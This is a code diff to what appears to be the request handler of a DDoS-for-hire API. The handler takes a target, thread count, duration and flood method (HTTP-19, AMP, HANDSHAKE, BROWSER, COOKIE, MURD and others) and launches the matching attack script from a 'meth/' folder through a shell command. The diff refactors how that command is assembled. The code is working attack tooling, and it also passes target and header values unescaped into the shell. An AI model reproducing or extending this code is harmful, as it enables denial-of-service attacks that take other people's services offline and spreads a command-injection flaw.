@@ -40,20 +40,21 @@ def req(TARGET, TIME, THREAD, METHODS):
         links = request.headers.get('X-Links')
         if links is None:links = '/'
         proxy = request.headers.get('X-Browser')
-        com = ''
         folder = 'meth/'
+        com = f'python {folder}{upper_methods.replace('-','_')}.py '
         if upper_methods in ['HTTP-19','HTTP-VAR','HTTP-FU']:
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {TARGET} {ports_opt} {THREAD} {TIME} {meth_opt}"
+            com += f"{TARGET} {ports_opt} {THREAD} {TIME} {meth_opt}"
         elif upper_methods == 'HTTP-ELE':
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {TARGET} {ports_opt} {THREAD} {meth_opt}"
-        elif upper_methods in ['AMP','HANDSHAKE']:
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt}"
-        elif upper_methods == 'BROWSER':
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy} command.txt"
-        elif upper_methods in ['COOKIE','COOKIE2']:
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy}"
-        elif upper_methods in ['MURD-OPT','MURD','RAPID-FAST']:
-            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {meth_opt}"
+            com += f"{TARGET} {ports_opt} {THREAD} {meth_opt}"
+        else:
+            if upper_methods in ['MURD-OPT','MURD','RAPID-FAST']:
+              com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {meth_opt}"
+            else:
+             com += f"{protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt}"
+             if upper_methods == 'BROWSER':
+              com += f" {proxy} command.txt"
+             elif upper_methods in ['COOKIE','COOKIE2']:
+              com += f" {proxy}"
         threading.Thread(target=execute_command,args=(com,)).start()
         return f'{METHODS} {THREAD}/{TIME}s HTTP={meth_opt} --> {TARGET}'
     else:return 'IDK'
